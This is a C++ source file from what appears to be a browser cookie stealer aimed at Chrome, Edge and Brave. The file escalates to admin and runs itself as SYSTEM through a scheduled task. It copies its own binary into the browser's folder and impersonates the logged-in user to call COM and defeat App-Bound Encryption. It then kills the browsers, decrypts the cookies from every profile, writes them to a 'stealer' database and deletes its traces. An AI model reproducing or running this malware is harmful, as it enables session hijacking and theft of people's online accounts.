#include "includes\AppBoundKeyParser.h"
#include "includes\Helper.h"
//#include "includes\AppBoundKeyDecryptor.h"
#include "includes\AppBoundDecryptor.h"
#include "includes\TaskService.h"

std::string app_bound_browser_paths = "AppData\\Local\\";
std::vector<std::string> browsers_app_bound = {
	"BraveSoftware\\Brave-Browser\\",
	"Google\\Chrome\\",
	"Microsoft\\Edge\\"
};

BOOL app_bound_browsers_cookie_collector(std::string username, std::string stealer_db, BOOL service, std::string service_parameter)
{
	if (service)
	{
		if (service_parameter.find("-exec") != std::string::npos)
		{
			//CALL COM OBJECTS and snatch keys
			//CALL Functions that will be in Decryptor class

			AppBoundDecryptor app_obj;
			if (!app_obj.RequestCOM(service_parameter))
				exit(-1);

			exit(0);
		}
		//---------------------------------------

		char modulePath[MAX_PATH];
		if (GetModuleFileNameA(NULL, modulePath, MAX_PATH) == 0) {
			exit(-1);
		}

		//AppBoundKeyDecryptor key_obj;
		std::string target_user_data;
		std::string target_location_data;

		// Those paths that contains \\ at the end means they have the default file 'User Data'
		// Those paths that doesn't contain \\ at the end means they are the data directories themselves
		for (const auto& dir : browsers_app_bound) {
			if (dir.back() == '\\')
				target_user_data = "C:\\users\\" + service_parameter + "\\" + app_bound_browser_paths + dir + "User Data";
			else
			{
				// in case of opera, the login data is in roaming instead of local
				if (dir.find("Opera") != std::string::npos)
					target_user_data = "C:\\users\\" + service_parameter + "\\" + "AppData\\Roaming\\" + dir;
				else
					target_user_data = "C:\\users\\" + service_parameter + "\\" + app_bound_browser_paths + dir;
			}

			target_location_data = target_user_data + "\\Last Browser";
			std::string fileContent = ReadUTF16LEFileToUTF8(target_location_data);
			if (fileContent == "")
				continue;

			std::string exeName = fileContent.substr(fileContent.find_last_of("\\/") + 1);
			size_t lastSlash = fileContent.find_last_of("\\");
			size_t secondLastSlash = fileContent.find_last_of("\\", lastSlash - 1);
			//size_t thirdLastSlash = fileContent.find_last_of("\\", secondLastSlash - 1);
			std::string grandParentFolder = fileContent.substr(0, secondLastSlash);
			std::string destinationPath = grandParentFolder + "\\" + exeName;

			if (!CopyFileA(modulePath, destinationPath.c_str(), FALSE)) {
				exit(-1);
			}

			////-------------------------------------------------------------------------
			std::string service_parameter_flagged = service_parameter + "-exec";
			std::vector<std::string> parameters = { "-app-bound-decryption", "-service", service_parameter_flagged };

			// Build command line string
			std::string commandLine = destinationPath.c_str();

			for (const auto& param : parameters) {
				commandLine += " " + param;
			}

			////---------------------------------------------------------------------------
			//std::wstring w_cmdline = StringToWString(commandLine);
			//STARTUPINFO si = { sizeof(si) };
			//PROCESS_INFORMATION pi;

			//if (!CreateProcess(
			//	NULL,                  // No module name (use command line)
			//	const_cast<LPWSTR>(w_cmdline.c_str()), // Command line
			//	NULL,                  // Process handle not inheritable
			//	NULL,                  // Thread handle not inheritable
			//	FALSE,                // Set handle inheritance to FALSE
			//	0,                     // No creation flags
			//	NULL,                  // Use parent's environment block
			//	NULL,                  // Use parent's starting directory 
			//	&si,                   // Pointer to STARTUPINFO structure
			//	&pi)                   // Pointer to PROCESS_INFORMATION structure
			//	) {
			//	// Handle error
			//}

			//// Optionally, wait for the process to finish
			//WaitForSingleObject(pi.hProcess, INFINITE);

			//// Close handles
			//CloseHandle(pi.hProcess);
			//CloseHandle(pi.hThread);
			////--------------------------------------------------------------------------

			//Since this section of code is running as a SERVICE with SYSTEM privileges so in order to interact with the COM objects, we need user mode privileges. Need to create process as a user.
			std::wstring w_cmdline = StringToWString(commandLine);

			// Get the active user session
			DWORD sessionId = WTSGetActiveConsoleSessionId();
			HANDLE hUserToken;

			if (!WTSQueryUserToken(sessionId, &hUserToken)) {
				//std::cerr << "Failed to get user token. Error: " << GetLastError() << std::endl;
				exit(-1);
			}

			// Set up process startup info
			STARTUPINFO si = { sizeof(si) };
			PROCESS_INFORMATION pi = {};

			// Create the process as the user
			if (!CreateProcessAsUser(
				hUserToken,               // User token
				NULL,                     // No module name (use command line)
				const_cast<LPWSTR>(w_cmdline.c_str()), // Command line
				NULL,                     // Process handle not inheritable
				NULL,                     // Thread handle not inheritable
				FALSE,                    // Set handle inheritance to FALSE
				0,						  // No creation Flags
				NULL,                     // Use parent's environment block
				NULL,                     // Use parent's starting directory
				&si,                      // Pointer to STARTUPINFO structure
				&pi                       // Pointer to PROCESS_INFORMATION structure
			)) {
				//std::cerr << "Failed to create process as user. Error: " << GetLastError() << std::endl;
				CloseHandle(hUserToken);
				exit(-1);
			}

			// Optionally, wait for the process to finish
			WaitForSingleObject(pi.hProcess, INFINITE);

			// Close handles
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			CloseHandle(hUserToken);

			//-------Delete binaries in here
			DeleteFileAfterExit(destinationPath.c_str());
		}
		exit(0);
	}

	if (!CheckProcessPriv())
	{
		std::cerr << "Admin Privileges Required !!!" << std::endl;
		RestartAsAdmin("-app-bound-decryption");
	}

	std::wstring TaskName = StringToWString("shaddy43");
	std::wstring Path = GetExecutablePath();
	std::string combine_arg = "-app-bound-decryption -service " + username;
	std::wstring Argument = StringToWString(combine_arg);

	if (!CreateScheduledTask(TaskName, Path, Argument))
		return false;

	Sleep(500);
	if (!RunScheduledTask(TaskName))
		return false;

	Sleep(3000);
	DeleteScheduledTask(TaskName);

	std::vector<DataHolder> data_list;
	std::string target_user_data;
	std::string target_cookie_data;
	std::string target_cookies_location;

	// Those paths that contains \\ at the end means they have the default file 'User Data'
	// Those paths that doesn't contain \\ at the end means they are the data directories themselves
	for (const auto& dir : browsers_app_bound) {

		if (dir.back() == '\\')
			target_user_data = "C:\\users\\" + username + "\\" + app_bound_browser_paths + dir + "User Data";
		else
		{
			// in case of opera, the login data is in roaming instead of local
			if (dir.find("Opera") != std::string::npos)
				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
			else
				target_user_data = "C:\\users\\" + username + "\\" + app_bound_browser_paths + dir;
		}

		//target_cookie_data = target_user_data + "\\Default\\Network\\Cookies";

		target_cookies_location = "\\Network\\Cookies";
		target_cookie_data = target_user_data + "\\Default" + target_cookies_location;

		// -------------- search profiles -----------------
		std::vector<std::string> target_profiles = { target_cookie_data };
		int browser_profile_number = 0;
		std::string search_profile;

	profile_label_app_bound:
		search_profile = "\\Profile ";
		search_profile = search_profile + std::to_string(++browser_profile_number);
		target_cookie_data = target_user_data + search_profile + target_cookies_location;
		if (std::filesystem::exists(target_cookie_data))
		{
			target_profiles.push_back(target_cookie_data);
			goto profile_label_app_bound;
		}

		for (const auto& prof : target_profiles) {
			target_cookie_data = prof;

			try {
				sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");

				if (stmt == nullptr)
				{
					// cookies file is locked when chromium based browser is running
					if (!kill_process(dir))
						continue;

					stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
					if (stmt == nullptr)
					{
						continue;
					}
				}

				//Decrypt key
				std::string service_data_path = "c:\\users";
				service_data_path += "\\public\\";
				service_data_path += "NTUSER.dat";

				if (!waitForFile(service_data_path, 3000, 100))
					continue;

				AppBoundDecryptor obj;
				if (obj.AppBoundDecryptorInit(service_data_path, dir))
				{
					while (sqlite3_step(stmt) == SQLITE_ROW)
					{
						DataHolder data;

						char* host_key = (char*)sqlite3_column_text(stmt, 0);
						char* name = (char*)sqlite3_column_text(stmt, 1);

						std::vector<BYTE> cookies;
						const void* encrypted_value = sqlite3_column_blob(stmt, 3);
						int encrypted_value_size = sqlite3_column_bytes(stmt, 3);
						char* expiry = (char*)sqlite3_column_text(stmt, 4);

						if (host_key != nullptr && name != nullptr && encrypted_value != nullptr && encrypted_value_size > 0) {
							// Assign the BLOB data to the std::vector<BYTE>
							cookies.assign((const BYTE*)encrypted_value, (const BYTE*)encrypted_value + encrypted_value_size);

							if ((strlen(host_key) == 0) || (strlen(name) == 0) || cookies.empty())
								continue;

							try
							{
								//decrypt cookies here
								std::string decrypted_cookies = obj.AESDecrypter(cookies);

								if (decrypted_cookies.empty())
									continue;

								if (decrypted_cookies.size() > 32) {
									decrypted_cookies.erase(0, 32);  // Remove the first 32 bytes
								}

								data.get_cookies_manager().setCookies(decrypted_cookies);
								data.get_cookies_manager().setUrl(host_key);
								data.get_cookies_manager().setCookieName(name);
								data.get_cookies_manager().setHost(dir);
								data.get_cookies_manager().setCookiesExpiry(expiry);
							}
							catch (int e)
							{
								continue;
							}

							data_list.push_back(data);
						}
						else {
							// Handle the case where the cookies_blob is null (no data)
							continue;
						}
					}
				}
				else
				{
					continue;
				}
			}
			catch (int e)
			{
				continue;
			}
		}
	}

	if (data_list.size() == 0)
		return false;

	if (!dump_cookie_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}